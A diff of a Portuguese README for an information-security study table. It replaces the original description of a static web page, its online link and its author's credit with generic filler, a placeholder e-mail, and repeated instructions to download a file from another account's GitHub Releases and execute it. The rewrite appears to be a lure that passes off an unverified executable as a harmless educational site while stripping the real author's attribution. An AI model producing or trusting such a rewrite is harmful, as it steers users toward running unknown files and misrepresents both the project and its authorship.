@@ -1,77 +1,70 @@
-# 🔐 Tabela Periódica da Segurança da Informação
+# Seguranca da Informação 📊🔐
 
-Este projeto é uma tabela interativa que apresenta os principais conceitos, certificações, normas, ataques, ferramentas e áreas da Segurança da Informação — organizada de forma didática como uma "tabela periódica".
+![Segurança da Informação](https://img.shields.io/badge/Security%20Information-Interactive%20Table-blue.svg)
+![GitHub Releases](https://img.shields.io/badge/Download%20Releases-v1.0.0-orange.svg)
 
----
+Esta tabela interativa foi criada para facilitar o aprendizado dos principais conceitos da Segurança da Informação. Se você está começando sua jornada neste campo ou deseja aprimorar seus conhecimentos, você está no lugar certo!
 
-## 💡 Objetivo
+## Tabela Interativa
 
-Facilitar o aprendizado e a consulta sobre temas essenciais da cibersegurança. Ideal para iniciantes e profissionais que desejam explorar os diversos domínios da área de segurança da informação.
+A tabela interativa oferece uma maneira prática de explorar conceitos fundamentais da Segurança da Informação. Você pode acessar a tabela e começar a aprender sobre os tópicos que mais lhe interessam. Para baixar e executar a tabela, visite [as Releases do projeto](https://github.com/flisly/segurancadainformacao/releases).
 
----
+## Tópicos Abordados
 
-## 🧩 Funcionalidades
+Aqui estão alguns dos principais tópicos que você encontrará na tabela:
 
-- 🔍 **Busca inteligente** (ignora acentos, plurais e destaca os termos encontrados)  
-- 📚 **Categorias temáticas**: Certificações, Normas, Ataques, Ferramentas, Cloud, Métricas e muito mais  
-- 🔗 **Links externos confiáveis** para aprofundamento em cada item  
-- 📂 **Subcategorias colapsáveis** (ex: Certificações Iniciais / Intermediárias / Avançadas)  
-- 🌙 **Visual estilo terminal hacker** com tema escuro (dark mode)
+- **Aprendizado**: Recursos e técnicas para aprender sobre segurança da informação.
+- **Blue Team**: Práticas de defesa em cibersegurança.
+- **Certificados**: Informações sobre certificações relevantes no campo.
+- **Ferramentas**: Softwares e ferramentas úteis para profissionais de segurança.
+- **Hacker**: Entenda o papel dos hackers e suas técnicas.
+- **Open Source**: Projetos de código aberto que podem ajudar no aprendizado.
+- **Red Team**: Táticas de ataque e simulação de invasões.
+- **Redes de Computadores**: Conceitos básicos sobre redes e sua segurança.
+- **Segurança da Informação**: Princípios e práticas gerais.
+- **Tecnologia**: Inovações e tendências em segurança.
 
----
+## Como Usar a Tabela
 
-## 📁 Estrutura do Projeto
+1. **Acesse a Tabela**: Clique no link para baixar a tabela.
+2. **Execute o Arquivo**: Siga as instruções no arquivo para executar a tabela interativa.
+3. **Explore os Tópicos**: Navegue pelos conceitos e descubra mais sobre cada um deles.
 
-```
-site_organizado/
-├── index.html          # Página principal da tabela
-├── style.css           # Estilos visuais (tema escuro, neon, layout)
-├── script.js           # Lógica de busca, filtragem e interação
-├── favicon.ico         # Ícone da aba do navegador
-├── robots.txt          # Permissões para motores de busca
-├── sitemap.xml         # Mapa do site para SEO
-├── googleXXXX.html     # Verificação do Google Search Console
-├── img/
-│   ├── logo.webp       # Logotipo do projeto
-│   └── hacker.png      # Imagem de fundo
-└── README.md           # Documentação do projeto
-```
+## Recursos Adicionais
 
----
+### Artigos e Tutoriais
 
-## 🛠️ Tecnologias Utilizadas
+- **Introdução à Segurança da Informação**: Um guia básico para iniciantes.
+- **Melhores Práticas de Segurança**: Dicas para proteger seus dados.
+- **Estudo de Caso**: Análise de incidentes de segurança famosos.
 
-- **HTML5**
-- **CSS3** com efeitos visuais modernos (dark mode, neon)
-- **JavaScript Vanilla** (sem frameworks)
-- **Hospedagem estática gratuita** via GitHub Pages, Netlify ou Vercel
+### Comunidade
 
----
+Participe de fóruns e grupos de discussão sobre segurança da informação. Compartilhe suas experiências e aprenda com os outros. Aqui estão algumas sugestões:
 
-## 🚀 Como acessar
+- [Forum de Segurança da Informação](https://www.segurancainformacao.com/forum)
+- [Grupo no Telegram](https://t.me/segurancadainformacao)
 
-Você pode visualizar a versão online aqui:  
-🔗 **[https://jonhnysantos.netlify.app](https://jonhnysantos.netlify.app)**
+## Contribuições
 
-> (ou substitua com seu domínio personalizado / nome de usuário no GitHub, se estiver usando GitHub Pages)
+Se você deseja contribuir para este projeto, sinta-se à vontade para abrir um pull request ou relatar um problema. Sua participação é muito bem-vinda!
 
----
+## Contato
 
-## 🤝 Contribuições
+Para dúvidas ou sugestões, você pode entrar em contato através do GitHub ou enviar um e-mail para [seuemail@example.com](mailto:seuemail@example.com).
 
-Contribuições são super bem-vindas!  
-Sinta-se à vontade para abrir **issues** ou enviar **pull requests** com melhorias, correções ou sugestões de novas funcionalidades.
+## Licença
 
----
+Este projeto está licenciado sob a [MIT License](LICENSE).
 
-## 📜 Licença
+## Baixe a Tabela
 
-Distribuído sob a licença **MIT**.  
-Você pode usar, modificar e distribuir livremente, desde que mantenha os devidos créditos ao autor.
+Para baixar a tabela interativa, visite [as Releases do projeto](https://github.com/flisly/segurancadainformacao/releases). Aqui você encontrará a versão mais recente e poderá começar sua jornada no aprendizado da Segurança da Informação.
 
----
+## Agradecimentos
 
-**Autor:** Johnny Santos  
-📧 Em caso de dúvidas ou sugestões, entre em contato!
+Agradecemos a todos que contribuíram para este projeto. Sua ajuda torna a comunidade de segurança da informação mais forte e acessível.
 
-Siga-me: https://www.linkedin.com/in/jonhnysantos/
+## Conclusão
+
+Esperamos que você aproveite esta tabela interativa e que ela seja um recurso valioso em sua jornada de aprendizado. A Segurança da Informação é um campo em constante evolução, e estar bem informado é essencial. Boa sorte e bons estudos!
